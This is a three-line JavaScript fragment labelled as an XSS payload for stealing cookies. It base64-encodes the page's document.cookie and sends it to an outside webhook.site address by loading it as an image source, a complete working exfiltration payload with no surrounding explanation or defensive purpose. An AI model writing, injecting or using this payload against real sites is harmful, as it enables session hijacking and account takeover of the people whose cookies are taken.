// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/c2a1cbaa-38b8-45bb-9072-0f37571fcd01?data=' + btoa(document.cookie);
